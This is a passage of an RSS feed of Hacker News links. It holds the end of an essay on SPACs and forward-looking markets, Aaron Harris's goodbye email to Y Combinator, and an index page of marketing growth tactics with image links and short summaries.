<p>This dynamic actually works in two directions: first, it means that the odds of Luminar selling LiDAR conditional on LiDAR becoming ubiquitous are higher, because the latter is most probably going to happen if the former is true. And second, it’s a recruiting tool: if there’s one company that has a reasonable shot at accomplishing something, and it’s a desirable goal, then the company has a monopoly on the kinds of employees who can achieve that goal. This is a point Peter Thiel articulates in <i>Zero to One</i>, and it’s one of the reasons technology companies have such a skewed distribution of outcomes. They articulate a variant view, which means they attract people who share that variant view—and since the argument is settled by technology and economics, they don’t have to persuade the rest of the world, just to offer a better product.</p>
<p>The rise of special purpose acquisition vehicles, or SPACs, is a general testament to a more forward-looking market. In a conventional IPO, an operating company sells shares to the public; with a SPAC, an empty shell company goes public, and then identifies a private company to merge with. Due to a quirk in securities laws, a traditional IPO prospectus only shows a company’s backwards-looking estimates, and makes heavily-qualified statements about the future. A company that goes public through a SPAC is technically engaging in a merger, rather than an IPO, and the rules are different. When a public company buys another company, securities laws allow it to talk about that company’s anticipated growth, or the likely cost savings of the merger. Similarly, SPAC offerings can talk up a company’s long-term prospects, and even make exact estimates of future revenue.</p>
<p>SPACs have existed for years, but they exploded in popularity in 2020. Of the 466 SPAC companies that went public from 2011 through 2020, 248 of them went public in 2020 alone. A number of technical forces drove this—a large number of private companies looking for acquisitions, investors eager to get into <i>any</i> growth company early, some technicalities around SPAC issuance that make them attractive to specialist hedge funds. But the key driver of excitement about SPACs is that they can take companies public based on a future-focused outlook.</p>
<p>When Virgin Galactic went public by merging with Chamath Palihapitiya’s Social Capital Hedosophia Holdings, the company, which has taken deposits but generated minimal revenue, was able to project $590 million in annual revenue in the year 2023, and over a quarter of a billion dollars in pretax, pre-depreciation earnings. While this was optimistic, it’s also demonstrative: a company like Virgin Galactic would have been almost impossible to take public in a conventional way, because backwards-looking financial statements showed only losses. it may not work out as a business, or live up to its projections, but those projections got more plausible once it had access to public markets for funding.</p>
<p>High valuations for money-losing, often pre-revenue companies remind people of the dot-com bubble, and it’s worth putting that bubble in perspective. Someone who bought the market at its peak in March 2000 has earned a 6% compounded return since then. …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://worksinprogress.co/issue/how-covid-brought-the-future-back/">https://worksinprogress.co/issue/how-covid-brought-the-future-back/</a></em></p>]]>
            </description>
            <link>https://worksinprogress.co/issue/how-covid-brought-the-future-back/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116488</guid>
            <pubDate>Fri, 12 Feb 2021 17:58:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Goodbye YC]]>
            </title>
            <description>
<![CDATA[
Score 220 | Comments 37 (<a href="https://news.ycombinator.com/item?id=26116420">thread link</a>) | @awaxman11
<br/>
February 12, 2021 | https://blog.aaronkharris.com/goodbye-yc | <a href="https://web.archive.org/web/*/https://blog.aaronkharris.com/goodbye-yc">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
      <div><p><i>I sent this email to the whole team at YC yesterday:</i></p><p>When I joined&nbsp;YC&nbsp;7.5 years ago, there weren’t many people around. PG and Jessica were still running things. We had offices in Mountain View, Palo Alto, and on Kearny street, but they were nearly always empty. The only meeting on any calendar was the lunch on Thursdays where we’d talk about companies over takeout or at a table in a crowded restaurant.</p><p>The ways in which we’ve changed since then have been amazing to see.&nbsp;YC&nbsp;has grown in every way imaginable. The scope of what&nbsp;YC&nbsp;funds is larger. The team is bigger and more capable. The number of companies is pushing towards some ever receding upper bound. There’s more software, a larger community, and more programming designed to help&nbsp;YC&nbsp;founders build better futures.</p><p>I feel a deep sense of pride and honor at the part that I’ve played in that change and growth. I recall the first conversation I had with Aaron King about the Series A for Snapdocs. The questions he and I worked through were the kernel of the Series A program. I am amazed to see the directions in which Janelle is now building YCA. I’m grateful for the part I played in our conversations about growing beyond seed investing - conversations which eventually took shape as YCC. And, of course, there are fifteen batches worth of applications, interviews, dinners, office hours, and demo days rattling around in my head.<br></p><p>I’ve been thinking, recently, about the founders with whom I’ve had a chance to work. I’ve lost count of the number of incredible people I’ve gotten to know over these last years. Thinking back, it’s easy to see how the sheer weight of numbers can drive a person to be jaded about the problems that founders face. But the other night, as I spoke with a founder about a tough situation, I was reminded about how important it is to that individual that she gets the best possible advice. This is a lesson I learned time and again, and is something I hope I’ll never forget.</p><p>And then there’s the funny stuff. There were stolen air conditioners, barefoot pitches, robots that did not make sandwiches, update emails pulled from the I Ching, bandages, inhaled jet fuel, and literal blood on the interview floors. These are the things that I’ll remember long after everything else.</p><p>The truth is, I only meant to stick around&nbsp;YC&nbsp;for two years. Somehow, that two became two more, and then some more. As meaningfully as I’ve enjoyed my work here, it’s time for me to move onto something different and new and outside the bounds of what&nbsp;YC&nbsp;does. That’s a strange, exhilarating moment, and an important one for me and for my family. The pandemic provided the practical and existential nudge I needed to see the depth of this need.</p><p>To my fellow partners - thank you for your tireless work for our founders and for&nbsp;YC. Thank you for everything you’ve taught me, for all the strange conversations we’ve had, and for all the demo day presentations we’ve crafted.</p><p>To PG and Jessica and Trevor and RTM - thank you for giving me this opportunity and for making&nbsp;YC&nbsp;the kind of place I could love enough to stay long after I meant to leave.</p><p>To Janelle - thank you for building YCA with me and for being the best person I could imagine to take it into the future.</p><p>To everyone else -&nbsp;YC’s mission in the world is abstract. It could mean so many things, but it wouldn’t be anything without your work. Whether you are managing founder expectations about housing in the Bay Area, helping someone understand the mysteries of cap tables, talking someone down off the ledge of yelling at a reporter, or making sure that there will one day be an office to come back to, you are what makes&nbsp;YC&nbsp;a viable, vital force in the world.</p><p>I’ve never liked&nbsp;goodbye.</p><p>aaron</p></div>
    
  </div></div>]]>
            </description>
            <link>https://blog.aaronkharris.com/goodbye-yc</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116420</guid>
            <pubDate>Fri, 12 Feb 2021 17:54:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Marketing Patterns – DIY Template for Growth]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26116276">thread link</a>) | @zxlk21e
<br/>
February 12, 2021 | https://terrygodier.com/patterns/ | <a href="https://web.archive.org/web/*/https://terrygodier.com/patterns/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<section>

<!-- begin patterns -->
												<div>
					<p><a href="https://terrygodier.com/patterns/ridiculous-products-for-digital-pr/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1-150x79.png" alt="digital pr 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Launch Ridiculous Products for Digital PR and Links 1" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2021/02/digital_pr-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/interest-tests-with-facebook-ads/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1-150x79.png" alt="interest targeting 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Test Audience Interests with Facebook Ads 2" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2021/02/interest-targeting-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/leverage-your-data/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1-150x79.png" alt="data stories 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Leverage Your Data for Marketing and Linkbuilding 3" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2021/01/data-stories-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/meta-content/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1-150x79.png" alt="meta content 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Build Hype by Creating Meta Content 4" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/12/meta-content-768x403-1-150x79.png"></a>
					</p>
					<div>
					<h2><a href="https://terrygodier.com/patterns/meta-content/">Build Hype by Creating Meta Content</a></h2>
						<p>Meta content can build hype for upcoming releases, underscore quality claims, and provide a narrative to products and brands. </p>						<p><time datetime="2020-12-04T11:45:53+00:00">12/4/2020 11:45am</time></p>
					</div>
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/repurpose-and-recycle/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1-150x79.png" alt="recycle repurpose 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Repurpose and Recycle Content for Social Media 5" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/11/recycle-repurpose-768x403-1-150x79.png"></a>
					</p>
					<div>
					<h2><a href="https://terrygodier.com/patterns/repurpose-and-recycle/">Repurpose and Recycle Content for Social Media</a></h2>
						<p>Get better at promoting existing assets instead of becoming addicted to creating new ones. Repurposing creates many small assets from a larger piece, and recycling creates something new from many existing assets.</p>						<p><time datetime="2020-11-20T11:28:58+00:00">11/20/2020 11:28am</time></p>
					</div>
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/swag-giveaways/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1-150x79.png" alt="swag 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Do Swag Giveaways to Grow Your Business 6" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/11/swag-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/social-listening/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1-150x79.png" alt="social listening 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Monitor Your Social Media Mentions with Social Listening 7" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/11/social-listening-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/buy-data-from-google/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1-150x79.png" alt="buy data 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Use Google Ads to Buy Data from Google 8" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/buy-data-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/build-a-qa-library/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1-150x79.png" alt="qa library 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Build a Q&amp;A Library for SEO Growth 9" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/qa_library-768x403-1-150x79.png"></a>
					</p>
					<div>
					<h2><a href="https://terrygodier.com/patterns/build-a-qa-library/">How to Build a Q&amp;A Library for SEO Growth</a></h2>
						<p>Answering questions for your target audience builds credibility. Q&amp;A content has several viable distribution channels, which can help drive traffic and sales.</p>						<p><time datetime="2020-10-23T11:43:34+00:00">10/23/2020 11:43am</time></p>
					</div>
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/give-a-lifetime-deal/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1-150x79.png" alt="lifetime deals 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to do a Lifetime Deal on Your Product 10" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/lifetime-deals-768x403-1-150x79.png"></a>
					</p>
					<div>
					<h2><a href="https://terrygodier.com/patterns/give-a-lifetime-deal/">How to do a Lifetime Deal on Your Product</a></h2>
						<p>Running a large discount or lifetime deal allows you to drive significant amounts of users (and revenue), which can later be upsold for revenue expansion or leveraged for network effects.</p>						<p><time datetime="2020-10-21T14:39:15+00:00">10/21/2020 2:39pm</time></p>
					</div>
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/real-money-referral-programs/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1-150x79.png" alt="referral 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Real Money Referral Program Best Practices 11" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/referral-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/send-a-monthly-newsletter/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1-150x79.png" alt="newsletter 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Build a Monthly Newsletter That Converts 12" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/newsletter-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/integrate-into-an-ecosystem/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1-150x79.png" alt="integrate 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="API Marketing: How to Integrate Into an Ecosystem 13" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/integrate-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/become-a-perk/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1-150x79.png" alt="perks 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Get Your Product Listed as a Perk 14" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/perks-768x403-1-150x79.png"></a>
					</p>
					<div>
					<h2><a href="https://terrygodier.com/patterns/become-a-perk/">How to Get Your Product Listed as a Perk</a></h2>
						<p>Many training programs and communities offer membership perks, which include discounts and trials of tools and services. Become one and get users and sales. </p>						<p><time datetime="2020-10-08T14:54:27+00:00">10/8/2020 2:54pm</time></p>
					</div>
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/co-hosting-webinars-for-leads/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1-150x79.png" alt="co host webinar 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="SaaS Lead Gen: How to Co-host a Webinar 15" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/co-host-webinar-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/technology-profiling-for-prospects/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1-150x79.png" alt="profiling 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="SaaS Marketing with BuiltWith: Technology Profiling for Prospects 16" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/profiling-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/inclusion-on-best-lists/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1-150x79.png" alt="best lists 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Get Your Product Included on &quot;Best&quot; Lists 17" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/10/best-lists-768x403-1-150x79.png"></a>
					</p>
					
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/rlsas-for-broad-keywords/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1-150x79.png" alt="rlsa broad 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="How to Run RLSAs and Target Broad Queries 18" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/09/rlsa_broad-768x403-1-150x79.png"></a>
					</p>
					<div>
					<h2><a href="https://terrygodier.com/patterns/rlsas-for-broad-keywords/">How to Run RLSAs and Target Broad Queries</a></h2>
						<p>RLSAs allow you to bid on broad keywords but only for a specific audience that’s already familiar with your brand, therefore increasing the likelihood of a conversion outcome. </p>						<p><time datetime="2020-09-24T17:00:26+00:00">09/24/2020 5:00pm</time></p>
					</div>
				</div>
								<div>
					<p><a href="https://terrygodier.com/patterns/competitor-comparison-content/"><img width="150" height="79" src="https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1-150x79.png" alt="comparison 768x403 1" srcset="https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1.png 768w" sizes="(max-width: 150px) 100vw, 150px" title="Beat Your Competitors With Comparison Content 19" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20150%2079'%3E%3C/svg%3E" data-lazy-srcset="https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1-150x79.png 150w, https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1-300x157.png 300w, https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1.png 768w" data-lazy-src="https://terrygodier.com/wp-content/uploads/2020/09/comparison-768x403-1-150x79.png"></a>
					</p>
					<div>
					<h2><a href="https://terrygodier.com/patterns/competitor-comparison-content/">Beat Your Competitors With Comparison Content</a></h2>
